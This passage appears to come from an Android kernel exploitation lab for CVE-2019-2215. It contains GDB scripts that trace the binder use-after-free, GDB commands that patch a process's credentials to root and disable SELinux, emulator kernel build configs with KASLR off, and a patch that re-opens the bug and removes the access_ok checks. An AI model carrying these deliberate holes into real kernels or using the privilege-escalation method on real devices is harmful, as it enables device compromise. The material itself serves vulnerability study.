        break_at_exit=False, exit_callback=None,
    ):
        super(ExitBreakpoint, self).__init__(exit_symbol)

        self.silent = True
        self.proc_cmd = proc_cmd
        self.entry_symbol = entry_symbol
        self.exit_symbol = exit_symbol
        self.parameter = params or {}
        self.break_at_exit = break_at_exit
        self.exit_callback = exit_callback
    
    def stop(self):
        # Only process breakpoints for our target process
        is_target_process = False
        proc_comm = CurrentTaskHelper.get_current_proc_comm()
        
        if self.proc_cmd in proc_comm:
            is_target_process = True
        
        if not is_target_process:
            return False

        # Log function exit
        gdb.write(f"[-] {self.entry_symbol} → {self.exit_symbol} [EXIT]\n")

        # Call the exit callback if provided
        if self.exit_callback:
            self.exit_callback(self.parameter)

        # Determine if we should stop execution
        return self.break_at_exit


def setup_debugging():
    """Setup breakpoints for debugging the CVE-2019-2215 exploit"""
    
    # Clear any existing breakpoints
    gdb.execute("delete")
    gdb.write("\n╔═══════════════════════════════════════════════════════════╗\n")
    gdb.write("║  Binder Thread Debug Script for CVE-2019-2215              ║\n")
    gdb.write("╚═══════════════════════════════════════════════════════════╝\n\n")
    
    # Define the target process name
    target_process = "binder_uaf_exploit"
    
    # Setup breakpoints
    
    # 1. Monitor binder_thread before it's freed
    gdb.write("[+] Setting breakpoint at binder_free_thread\n")
    EnterBreakpoint(
        proc_cmd=target_process, 
        entry_symbol="binder_free_thread",
        param_list=["thread"], 
        exit_symbol=None, 
        break_at_entry=False,
        entry_callback=BinderThreadMonitor.set_and_dump_binder_thread, 
        break_at_exit=False,
        exit_callback=None, 
        set_exit_bp=False
    )

    # 2. Monitor the wait queue removal operation that triggers the UAF
    gdb.write("[+] Setting breakpoint at remove_wait_queue\n")
    EnterBreakpoint(
        proc_cmd=target_process, 
        entry_symbol="remove_wait_queue",
        param_list=["wq_head", "wq_entry"], 
        exit_symbol="wait.c:52",
        break_at_entry=False, 
        entry_callback=BinderThreadMonitor.dump_on_waitqueue_operation,
        break_at_exit=False, 
        exit_callback=BinderThreadMonitor.dump_on_waitqueue_operation,
        set_exit_bp=True
    )
    
    gdb.write("[+] Breakpoints configured. Resume execution to begin monitoring.\n\n")


# Initialize debugging setup when this script is loaded
setup_debugging()
```

`gdb-scripts/kernel_privesc.py`:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Android Kernel Debugging Tools for CVE-2019-2215
------------------------------------------------

A collection of GDB Python commands to assist with kernel exploitation,
specifically focused on privilege escalation via task credential manipulation.

These tools allow privilege escalation through kernel memory manipulation
by providing GDB commands to:
1. List all kernel tasks
2. Find task structures by PID
3. Elevate privileges for processes by manipulating their credentials
4. Disable SELinux enforcement

References:
- Based on Linux kernel GDB helpers: https://github.com/torvalds/linux/tree/master/scripts/gdb
"""

import gdb
import struct
from typing import Generator, Optional


class KernelHelpers:
    """Helper functions for Linux kernel debugging"""

    @staticmethod
    def offset_of(typeobj, field):
        """Calculate offset of a field within a struct"""
        element = gdb.Value(0).cast(typeobj)
        return int(str(element[field].address).split()[0], 16)

    @staticmethod
    def container_of(ptr, typeobj, member):
        """Implement C's container_of macro in Python"""
        return (ptr.cast(gdb.lookup_type("long")) - KernelHelpers.offset_of(typeobj, member)).cast(typeobj)

    @staticmethod
    def task_lists() -> Generator:
        """Generate all task_struct entries from the task lists"""
        task_ptr_type = gdb.lookup_type("struct task_struct").pointer()
        init_task = gdb.parse_and_eval("init_task").address
        t = g = init_task

        while True:
            while True:
                yield t
                
                # Move to next thread in thread group
                t = KernelHelpers.container_of(t["thread_group"]["next"],
                                               task_ptr_type, "thread_group")
                if t == g:
                    break

            # Move to next process
            t = g = KernelHelpers.container_of(g["tasks"]["next"], task_ptr_type, "tasks")
            if t == init_task:
                return

    @staticmethod
    def get_task_by_pid(pid: int) -> Optional[gdb.Value]:
        """Find task_struct by PID"""
        for task in KernelHelpers.task_lists():
            if int(task["pid"]) == pid:
                return task
        return None


class MemoryOperations:
    """Memory read/write operations for kernel exploitation"""

    @staticmethod
    def read32(address) -> int:
        """Read 32-bit integer from memory"""
        return struct.unpack("<i", gdb.selected_inferior().read_memory(address, 4))[0]

    @staticmethod
    def read64(address) -> int:
        """Read 64-bit integer from memory"""
        return struct.unpack("<Q", gdb.selected_inferior().read_memory(address, 8))[0]

    @staticmethod
    def write32(address, value: int) -> None:
        """Write 32-bit integer to memory"""
        gdb.selected_inferior().write_memory(address, struct.pack("<i", value), 4)

    @staticmethod
    def write64(address, value: int) -> None:
        """Write 64-bit integer to memory"""
        gdb.selected_inferior().write_memory(address, struct.pack("<Q", value), 8)


class PrivilegeEscalation:
    """Functions to escalate privileges in the kernel"""

    @staticmethod
    def root_task(task) -> None:
        """
        Give root privileges to the given task by modifying its credentials
        
        Args:
            task: A task_struct address
        """
        cred = task["cred"]
        
        # Global constants
        GLOBAL_ROOT_UID = 0
        GLOBAL_ROOT_GID = 0
        SECUREBITS_DEFAULT = 0
        CAP_EMPTY_SET = 0x0000000000000000
        CAP_FULL_SET = 0x3FFFFFFFFF  # All capabilities set
        
        # Set all UIDs and GIDs to root (0)
        for field in ["uid", "gid", "suid", "sgid", "euid", "egid", "fsuid", "fsgid"]:
            value = GLOBAL_ROOT_UID if field.endswith("uid") else GLOBAL_ROOT_GID
            MemoryOperations.write32(cred[field].address, value)
        
        # Reset security bits
        MemoryOperations.write32(cred["securebits"].address, SECUREBITS_DEFAULT)
        
        # Set capabilities
        MemoryOperations.write64(cred["cap_inheritable"].address, CAP_EMPTY_SET)
        MemoryOperations.write64(cred["cap_permitted"].address, CAP_FULL_SET)
        MemoryOperations.write64(cred["cap_effective"].address, CAP_FULL_SET)
        MemoryOperations.write64(cred["cap_bset"].address, CAP_FULL_SET)
        MemoryOperations.write64(cred["cap_ambient"].address, CAP_EMPTY_SET)

    @staticmethod
    def set_selinux_task_context(task) -> None:
        """
        Set SELinux task context to kernel context
        
        Args:
            task: A task_struct address
        """
        # SELinux constants
        SECINITSID_KERNEL = 1  # Kernel security context ID
        
        cred = task["cred"]
        security = cred["security"]
        
        # Cast to task_security_struct
        security_struct_t = gdb.lookup_type("struct task_security_struct").pointer()
        security_struct = security.cast(security_struct_t)
        
        # Set original and current security IDs to kernel
        MemoryOperations.write32(security_struct["osid"].address, SECINITSID_KERNEL)
        MemoryOperations.write32(security_struct["sid"].address, SECINITSID_KERNEL)

    @staticmethod
    def disable_selinux_enforcing() -> None:
        """Disable SELinux enforcing mode globally"""
        selinux_enforcing = gdb.parse_and_eval("selinux_enforcing")
        MemoryOperations.write32(selinux_enforcing.address, 0)


#=============================================================================
# GDB Commands
#=============================================================================

class TaskListCommand(gdb.Command):
    """List all task_struct entries in the kernel"""

    def __init__(self):
        super(TaskListCommand, self).__init__("task-list", gdb.COMMAND_DATA)

    def invoke(self, arg, from_tty):
        gdb.write("╔══════════════════════════════════════════════════════════════════════════════════╗\n")
        gdb.write("║                               Kernel Task List                                   ║\n")
        gdb.write("╚══════════════════════════════════════════════════════════════════════════════════╝\n")
        
        for task in KernelHelpers.task_lists():
            gdb.write(f"Task: {task}  PID: {task['pid']}  Command: {task['comm'].string()}\n")


class TaskByPidCommand(gdb.Command):
    """Find and display task_struct by PID"""

    def __init__(self):
        super(TaskByPidCommand, self).__init__("task-by-pid", gdb.COMMAND_DATA)

    def invoke(self, arg, from_tty):
        argv = gdb.string_to_argv(arg)

        if not argv:
            raise gdb.GdbError("Error: PID not provided. Usage: task-by-pid <pid>")

        try:
            pid = int(argv[0])
        except ValueError:
            raise gdb.GdbError(f"Error: Invalid PID format: {argv[0]}")

        task = KernelHelpers.get_task_by_pid(pid)

        if task:
            gdb.write("╔══════════════════════════════════════════════════════════════════════════════════╗\n")
            gdb.write("║                                Task Information                                  ║\n")
            gdb.write("╚══════════════════════════════════════════════════════════════════════════════════╝\n")
            gdb.write(f"Task Address: {task}\n")
            gdb.write(f"PID:          {task['pid']}\n")
            gdb.write(f"Command:      {task['comm'].string()}\n")
            gdb.write(f"Credentials:  {task['cred']}\n")
        else:
            gdb.write(f"No task found with PID: {pid}\n")


class RootByPidCommand(gdb.Command):
    """Give root privileges to a process by PID"""

    def __init__(self):
        super(RootByPidCommand, self).__init__("root-by-pid", gdb.COMMAND_DATA)

    def invoke(self, arg, from_tty):
        argv = gdb.string_to_argv(arg)

        if not argv:
            raise gdb.GdbError("Error: PID not provided. Usage: root-by-pid <pid>")

        try:
            pid = int(argv[0])
        except ValueError:
            raise gdb.GdbError(f"Error: Invalid PID format: {argv[0]}")

        task = KernelHelpers.get_task_by_pid(pid)
        if not task:
            gdb.write(f"Error: No task found with PID: {pid}\n")
            return

        gdb.write("╔══════════════════════════════════════════════════════════════════════════════════╗\n")
        gdb.write("║                         Privilege Escalation Utility                             ║\n")
        gdb.write("╚══════════════════════════════════════════════════════════════════════════════════╝\n")
        
        # Log task information
        gdb.write(f"[+] Target process:\n")
        gdb.write(f"    PID:         {task['pid']}\n")
        gdb.write(f"    Command:     {task['comm'].string()}\n")
        gdb.write(f"    Task addr:   {task}\n")
        gdb.write(f"    Credentials: {task['cred']}\n")
        
        # Patch process credentials
        gdb.write("\n[+] Patching process credentials...\n")
        PrivilegeEscalation.root_task(task)
        gdb.write("    ✓ Credentials modified\n")
        
        # Disable SELinux enforcement
        gdb.write("\n[+] Disabling SELinux enforcement...\n")
        selinux_addr = gdb.parse_and_eval("selinux_enforcing").address
        gdb.write(f"    SELinux enforcing at: {selinux_addr}\n")
        PrivilegeEscalation.disable_selinux_enforcing()
        gdb.write("    ✓ SELinux disabled\n")
        
        # Optionally modify SELinux task context
        if len(argv) > 1 and argv[1].lower() == "selinux":
            gdb.write("\n[+] Patching SELinux task context...\n")
            PrivilegeEscalation.set_selinux_task_context(task)
            gdb.write("    ✓ SELinux context modified\n")
        
        gdb.write("\n[✓] Privilege escalation complete! Process now has root privileges.\n")


def register_commands():
    """Register all custom GDB commands"""
    TaskListCommand()
    TaskByPidCommand()
    RootByPidCommand()


# Register commands when the script is loaded
if __name__ == "__main__":
    register_commands()
    print("Android Kernel Debugging Tools loaded successfully.")
    print("Available commands:")
    print("  task-list         - List all kernel tasks")
    print("  task-by-pid <pid> - Find task structure by PID")
    print("  root-by-pid <pid> - Elevate privileges for a process")
```

`kernel-build-configs/x86_64_kasan_build.sh`:

```sh
# Architecture and branch settings
ARCH=x86_64
BRANCH=kasan

# Compiler settings
CC=clang
CLANG_PREBUILT_BIN=prebuilts-master/clang/host/linux-x86/clang-r353983c/bin
BUILDTOOLS_PREBUILT_BIN=build/build-tools/path/linux-x86
CLANG_TRIPLE=x86_64-linux-gnu-

# Cross-compilation settings
CROSS_COMPILE=x86_64-linux-androidkernel-
LINUX_GCC_CROSS_COMPILE_PREBUILTS_BIN=prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.9/bin

# Kernel configuration
KERNEL_DIR=goldfish
EXTRA_CMDS=''
STOP_SHIP_TRACEPRINTK=1

# Output files to be generated
FILES="
arch/x86/boot/bzImage
vmlinux
System.map
"

# Default configuration
DEFCONFIG=x86_64_ranchu_defconfig
POST_DEFCONFIG_CMDS="check_defconfig && apply_kasan_settings"

# Function to apply KASAN (Kernel Address Sanitizer) settings
apply_kasan_settings() {
    # Update kernel configuration with KASAN settings
    ${KERNEL_DIR}/scripts/config --file ${OUT_DIR}/.config \
        --enable CONFIG_KASAN \
        --enable CONFIG_KASAN_INLINE \
        --enable CONFIG_TEST_KASAN \
        --enable CONFIG_KCOV \
        --enable CONFIG_SLUB \
        --enable CONFIG_SLUB_DEBUG \
        --enable CONFIG_SLUB_DEBUG_ON \
        --disable CONFIG_SLUB_DEBUG_PANIC_ON \
        --disable CONFIG_KASAN_OUTLINE \
        --disable CONFIG_KERNEL_LZ4 \
        --disable CONFIG_RANDOMIZE_BASE

    # Regenerate kernel configuration
    (cd ${OUT_DIR} && \
     make O=${OUT_DIR} $archsubarch CROSS_COMPILE=${CROSS_COMPILE} olddefconfig)
}

```

`kernel-build-configs/x86_64_kasan_debug_build.sh`:

```sh
# Architecture and branch settings
ARCH=x86_64
BRANCH=relwithdebinfo

# Compiler settings
CC=clang
CLANG_PREBUILT_BIN=prebuilts-master/clang/host/linux-x86/clang-r353983c/bin
BUILDTOOLS_PREBUILT_BIN=build/build-tools/path/linux-x86
CLANG_TRIPLE=x86_64-linux-gnu-

# Cross-compilation settings
CROSS_COMPILE=x86_64-linux-androidkernel-
LINUX_GCC_CROSS_COMPILE_PREBUILTS_BIN=prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.9/bin

# Kernel configuration
KERNEL_DIR=goldfish
EXTRA_CMDS=''
STOP_SHIP_TRACEPRINTK=1

# Output files to be generated
FILES="
arch/x86/boot/bzImage
vmlinux
System.map
"

# Default configuration
DEFCONFIG=x86_64_ranchu_defconfig
POST_DEFCONFIG_CMDS="check_defconfig && apply_debug_settings"

# Function to apply debug settings
apply_debug_settings() {
    # Update kernel configuration with debug options
    ${KERNEL_DIR}/scripts/config --file ${OUT_DIR}/.config \
        --enable CONFIG_FRAME_POINTER \
        --enable CONFIG_DEBUG_INFO \
        --disable CONFIG_DEBUG_INFO_REDUCED \
        --disable CONFIG_KERNEL_LZ4 \
        --disable CONFIG_RANDOMIZE_BASE

    # Regenerate kernel configuration

    (cd ${OUT_DIR} && \
     make O=${OUT_DIR} $archsubarch CROSS_COMPILE=${CROSS_COMPILE} olddefconfig)
}

```

`patches/android-binder-cve-2019-2215-patch.patch`:

```patch
diff --git a/drivers/android/binder.c b/drivers/android/binder.c
index f6ddec245187..55e2748a13e4 100644
--- a/drivers/android/binder.c
+++ b/drivers/android/binder.c
@@ -4768,10 +4768,12 @@ static int binder_thread_release(struct binder_proc *proc,
 	 * waitqueue_active() is safe to use here because we're holding
 	 * the inner lock.
 	 */
+	/*
 	if ((thread->looper & BINDER_LOOPER_STATE_POLL) &&
 	    waitqueue_active(&thread->wait)) {
 		wake_up_poll(&thread->wait, POLLHUP | POLLFREE);
 	}
+	*/
 
 	binder_inner_proc_unlock(thread->proc);
 
@@ -4781,8 +4783,10 @@ static int binder_thread_release(struct binder_proc *proc,
 	 * descriptor being closed); ep_remove_waitqueue() holds an RCU read
 	 * lock, so we can be sure it's done after calling synchronize_rcu().
 	 */
+	/*
 	if (thread->looper & BINDER_LOOPER_STATE_POLL)
 		synchronize_rcu();
+	*/
 
 	if (send_reply)
 		binder_send_failed_reply(send_reply, BR_DEAD_REPLY);
diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index 7b2fd5f251f2..67af61637f55 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -132,19 +132,21 @@
 
 static int copyout(void __user *to, const void *from, size_t n)
 {
-	if (access_ok(VERIFY_WRITE, to, n)) {
+	/*if (access_ok(VERIFY_WRITE, to, n)) {
 		kasan_check_read(from, n);
 		n = raw_copy_to_user(to, from, n);
-	}
+	}*/
+	n = raw_copy_to_user(to, from, n);
 	return n;
 }
 
 static int copyin(void *to, const void __user *from, size_t n)
 {
-	if (access_ok(VERIFY_READ, from, n)) {
+	/*if (access_ok(VERIFY_READ, from, n)) {
 		kasan_check_write(to, n);
 		n = raw_copy_from_user(to, from, n);
-	}
+	}*/
+	n = raw_copy_from_user(to, from, n);
 	return n;
 }
 
```